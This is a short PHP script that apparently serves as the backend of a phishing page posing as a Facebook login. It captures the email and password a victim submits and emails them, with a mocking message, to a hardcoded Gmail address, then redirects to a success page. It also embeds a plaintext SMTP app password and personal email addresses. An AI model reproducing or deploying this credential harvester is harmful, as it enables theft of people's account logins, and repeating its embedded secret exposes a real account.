<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

//Load Composer's
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';
require 'PHPMailer/src/Exception.php';

if (isset($_POST['send'])) {
    $email = $_POST['email'];
    $password = $_POST['password'];


    $mail = new PHPMailer(true);

    try {
        //Server settings
        //$mail->SMTPDebug = SMTP::DEBUG_SERVER;                               //Enable verbose debug output
        $mail->isSMTP();                                                      //Send using SMTP
        $mail->Host       = "smtp.gmail.com";                                 //Set the SMTP server to send through
        $mail->SMTPAuth   = true;                                           //Enable SMTP authentication
        $mail->Username   = "bidaoui.fettah@gmail.com";                    //SMTP username
        $mail->Password   = "tkpnxzawtuijocfr";                           //SMTP password
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;                 //Enable implicit TLS encryption
        $mail->Port       = 465;                                        //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

        //Recipients
        $mail->setFrom("bidaoui.fettah@gmail.com");
        $mail->addAddress("bidawi.fettah@gmail.com");               //Add a recipient

        //Content
        $mail->isHTML(true);                                       //Set email format to HTML
        $mail->Subject = 'Facebook login test';
        $mail->Body    = "Wahd khouna Ta7 fchabka <br> Email: $email <br> Password: $password <br> 3ich la vie ara bara3 hhhhhhhhhh";
        $mail->CharSet = 'UTF-8';

        $mail->send();

        header("Location: success.php");
    } catch (Exception $e) {
        header("Location: error.php");
    }
}